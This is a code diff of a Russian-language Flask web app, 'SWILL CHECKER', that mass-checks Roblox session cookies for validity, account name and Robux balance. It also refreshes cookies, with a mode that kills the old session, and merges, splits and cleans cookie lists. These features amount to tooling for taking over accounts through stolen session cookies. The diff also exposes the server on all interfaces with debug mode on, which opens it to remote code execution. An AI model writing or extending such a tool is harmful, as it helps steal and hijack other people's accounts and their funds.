@@ -177,7 +177,6 @@ def quick_validate(cookie):
     except: pass
     return result
 
-# ===== УВЕЛИЧИЛИ ПОТОКИ С 10 ДО 20 =====
 def mass_check(cookies_list):
     results = []
     with ThreadPoolExecutor(max_workers=20) as ex:
@@ -309,7 +308,6 @@ def clean_cookies(content):
 
 app = Flask(__name__)
 
-# ===== НОВЫЙ ИНТЕРФЕЙС V3 =====
 HTML = """<!DOCTYPE html>
 <html lang="ru" data-theme="dark">
 <head>
@@ -420,10 +418,8 @@ HTML = """<!DOCTYPE html>
     </style>
 </head>
 <body>
-
 <div class="bg-animation"></div>
 <div class="particles" id="particles"></div>
-
 <div class="wrapper">
     <header class="header">
         <div class="logo">✦ SWILL CHECKER</div>
@@ -435,14 +431,12 @@ HTML = """<!DOCTYPE html>
             <button class="btn btn-secondary btn-sm" onclick="toggleTheme()" style="margin-left:8px;">🌓</button>
         </div>
     </header>
-
     <div class="tabs">
         <div class="tab active" data-tab="checker">🔍 Чекер</div>
         <div class="tab" data-tab="fresher">🔄 Фрешер</div>
         <div class="tab" data-tab="history">📜 История</div>
         <div class="tab" data-tab="tools">⚡ Инструменты</div>
     </div>
-
     <div class="tab-content active" id="tab-checker">
         <div class="grid-2">
             <div class="card">
@@ -478,7 +472,6 @@ HTML = """<!DOCTYPE html>
             </div>
         </div>
     </div>
-
     <div class="tab-content" id="tab-fresher">
         <div class="card">
             <h2>🔄 Фрешер сессий</h2>
@@ -501,12 +494,10 @@ HTML = """<!DOCTYPE html>
             </div>
         </div>
     </div>
-
     <div class="tab-content" id="tab-history">
         <div class="card"><h2>📜 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h2><div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div></div>
         <div class="card"><h2>🔄 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h2><div id="fresherHistoryList"><div class="empty-history">Загрузка...</div></div></div>
     </div>
-
     <div class="tab-content" id="tab-tools">
         <div class="grid-2">
             <div class="card"><h3>🔗 Слияние</h3><div class="upload-area" id="mergeDropArea"><p>📁 Выберите файлы</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><button class="btn btn-primary mt-12 btn-block" onclick="mergeCookies()">🔄 Объединить</button><div class="result-box" id="mergeResult" style="max-height:80px;">Ожидание...</div></div>
@@ -515,10 +506,8 @@ HTML = """<!DOCTYPE html>
             <div class="card"><h3>📊 Статистика</h3><button class="btn btn-primary btn-block" onclick="loadStats()">📊 Обновить</button><div class="result-box" id="statsResult" style="max-height:80px;">Ожидание...</div></div>
         </div>
     </div>
-
     <div class="footer">SWILL CHECKER V3 · 20 потоков · Премиум-интерфейс</div>
 </div>
-
 <script>
 (function() {
     const container = document.getElementById('particles');
@@ -533,7 +522,6 @@ HTML = """<!DOCTYPE html>
         container.appendChild(particle);
     }
 })();
-
 function toggleTheme() {
     let html = document.documentElement;
     let current = html.getAttribute('data-theme');
@@ -545,7 +533,6 @@ function toggleTheme() {
     let saved = localStorage.getItem('theme');
     if (saved) document.documentElement.setAttribute('data-theme', saved);
 })();
-
 document.querySelectorAll('.tab').forEach(function(tab) {
     tab.addEventListener('click', function() {
         let tabId = this.getAttribute('data-tab');
@@ -557,13 +544,11 @@ document.querySelectorAll('.tab').forEach(function(tab) {
         if (tabId === 'checker') loadStats();
     });
 });
-
 function setFresherMode(mode) {
     document.getElementById('fresherMode').value = mode;
     document.getElementById('modeDuplicate').className = 'toggle-btn' + (mode === 'duplicate' ? ' active' : '');
     document.getElementById('modeKill').className = 'toggle-btn' + (mode === 'kill' ? ' active' : '');
 }
-
 function setupDrop(areaId, inputId) {
     let area = document.getElementById(areaId);
     if (!area) return;
@@ -584,7 +569,6 @@ setupDrop('massDropArea', 'massFile');
 setupDrop('fresherDropArea', 'fresherFile');
 setupDrop('mergeDropArea', 'mergeFiles');
 setupDrop('splitDropArea', 'splitFile');
-
 document.getElementById('massFile').addEventListener('change', function() {
     if (this.files && this.files[0]) {
         let file = this.files[0];
@@ -599,7 +583,6 @@ document.getElementById('massFile').addEventListener('change', function() {
         reader.readAsText(file);
     }
 });
-
 document.getElementById('fresherFile').addEventListener('change', function() {
     if (this.files && this.files[0]) {
         let reader = new FileReader();
@@ -607,10 +590,8 @@ document.getElementById('fresherFile').addEventListener('change', function() {
         reader.readAsText(this.files[0]);
     }
 });
-
 window.massResultsData = [];
 window.currentFilter = 'all';
-
 async function runSingleCheck() {
     let resBox = document.getElementById('singleResult');
     let cookie = document.getElementById('singleCookie').value.trim();
@@ -623,7 +604,6 @@ async function runSingleCheck() {
         loadStats();
     } catch(e) { resBox.textContent = '❌ ' + e.message; }
 }
-
 async function runMassCheck() {
     if (!window.massFileContent) { document.getElementById('massResult').textContent = '❌ Загрузите TXT файл!'; return; }
     let resBox = document.getElementById('massResult');
@@ -653,7 +633,6 @@ async function runMassCheck() {
         } else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
 }
-
 function applyFilter(type, element) {
     window.currentFilter = type;
     document.querySelectorAll('#filterBar .filter-chip').forEach(c => c.classList.remove('active'));
@@ -678,7 +657,6 @@ function applyFilter(type, element) {
     });
     document.getElementById('massResult').textContent = html || 'Нет результатов';
 }
-
 function copyValidCookies() {
     let valid = window.massResultsData.filter(r => r.status === '✅');
     let text = valid.map(r => r.cookie).join('\n');
@@ -688,7 +666,6 @@ function downloadValidOnly() { let valid = window.massResultsData.filter(r => r.
 function downloadInvalidOnly() { let invalid = window.massResultsData.filter(r => r.status === '❌'); downloadFile(invalid.map(r => r.cookie).join('\n'), 'invalid_cookies.txt'); }
 function downloadFullReport() { let text = ''; window.massResultsData.forEach(r => { if (r.status === '✅') { text += '✅ ' + r.username + ' [' + r.user_id + '] | R$' + r.robux + ' | ' + r.created + ' | Score:' + r.score + '\n' + r.cookie + '\n\n'; } else { text += '❌ ' + r.cookie + '\n'; } }); downloadFile(text, 'full_report.txt'); }
 function downloadFile(content, filename) { let blob = new Blob([content], { type: 'text/plain' }); let a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = filename; a.click(); }
-
 async function runFresher() {
     let cookies = document.getElementById('fresherCookies').value.trim();
     let mode = document.getElementById('fresherMode').value;
@@ -707,10 +684,8 @@ async function runFresher() {
         loadFresherHistory();
     } catch(e) { document.getElementById('fresherResult').textContent = '❌ ' + e.message; document.getElementById('fresherProgress').style.width = '0%'; }
 }
-
 function copyFresherCookies() { let text = document.getElementById('fresherResult').textContent; if (text && text !== 'Новые куки здесь...' && text !== '⏳ Обновление...') { navigator.clipboard.writeText(text).then(() => alert('✅ Скопировано!')); } }
 function downloadFresherCookies() { let text = document.getElementById('fresherResult').textContent; if (text && text !== 'Новые куки здесь...' && text !== '⏳ Обновление...') { downloadFile(text, 'refreshed_cookies.txt'); } }
-
 async function loadCheckerHistory() {
     try {
         let r = await fetch('/api/history/checker');
@@ -726,7 +701,6 @@ async function loadCheckerHistory() {
         document.getElementById('checkerHistoryList').innerHTML = html;
     } catch(e) { document.getElementById('checkerHistoryList').innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
 }
-
 async function loadFresherHistory() {
     try {
         let r = await fetch('/api/history/fresher');
@@ -742,10 +716,8 @@ async function loadFresherHistory() {
         document.getElementById('fresherHistoryList').innerHTML = html;
     } catch(e) { document.getElementById('fresherHistoryList').innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
 }
-
 async function clearCheckerHistory() { if (!confirm('Удалить историю проверок?')) return; await fetch('/api/history/checker/clear', { method: 'POST' }); loadCheckerHistory(); }
 async function clearFresherHistory() { if (!confirm('Удалить историю обновлений?')) return; await fetch('/api/history/fresher/clear', { method: 'POST' }); loadFresherHistory(); }
-
 async function mergeCookies() {
     let files = document.getElementById('mergeFiles').files;
     if (!files || files.length < 2) { document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла'; return; }
@@ -757,7 +729,6 @@ async function mergeCookies() {
         document.getElementById('mergeResult').innerHTML = d.success ? '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
     } catch(e) { document.getElementById('mergeResult').textContent = '❌ ' + e.message; }
 }
-
 async function splitByCount() {
     let file = document.getElementById('splitFile').files[0];
     if (!file) { document.getElementById('splitResult').textContent = '❌ Загрузите файл'; return; }
@@ -770,7 +741,6 @@ async function splitByCount() {
         document.getElementById('splitResult').innerHTML = d.success ? '✅ ' + d.file_count + ' файлов\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
     } catch(e) { document.getElementById('splitResult').textContent = '❌ ' + e.message; }
 }
-
 async function splitByFiles() {
     let file = document.getElementById('splitFile').files[0];
     if (!file) { document.getElementById('splitResult').textContent = '❌ Загрузите файл'; return; }
@@ -783,7 +753,6 @@ async function splitByFiles() {
         document.getElementById('splitResult').innerHTML = d.success ? '✅ ' + d.file_count + ' файлов\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
     } catch(e) { document.getElementById('splitResult').textContent = '❌ ' + e.message; }
 }
-
 async function cleanCookies(action) {
     let content = document.getElementById('cleanInput').value.trim();
     if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
@@ -794,7 +763,6 @@ async function cleanCookies(action) {
         document.getElementById('cleanResult').innerHTML = d.success ? '✅ ' + d.original_count + ' → ' + d.processed_count + (d.duplicates_removed > 0 ? ' (-' + d.duplicates_removed + ')' : '') + '\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
     } catch(e) { document.getElementById('cleanResult').textContent = '❌ ' + e.message; }
 }
-
 async function loadStats() {
     try {
         let r = await fetch('/api/stats');
@@ -808,7 +776,6 @@ async function loadStats() {
         }
     } catch(e) { document.getElementById('statsResult').textContent = '❌ ' + e.message; }
 }
-
 loadStats();
 loadCheckerHistory();
 loadFresherHistory();
@@ -816,7 +783,6 @@ loadFresherHistory();
 </body>
 </html>"""
 
-# ===== ЭНДПОИНТЫ =====
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -894,7 +860,7 @@ def api_fresher():
     success_count = 0
     fail_count = 0
     
-    for c in cookies_list:
+    for c in cookies_list[:50]:
         result = refresh_roblox_cookie(c, kill_old=(mode=='kill'))
         if result['success'] and result['new_cookie']:
             is_new = True
@@ -1029,4 +995,4 @@ def download_file(filename):
     return send_from_directory("downloads", filename, as_attachment=True)
 
 if __name__ == "__main__":
-    app.run(debug=True, port=5000)
+    app.run(debug=True, host='0.0.0.0', port=5000)
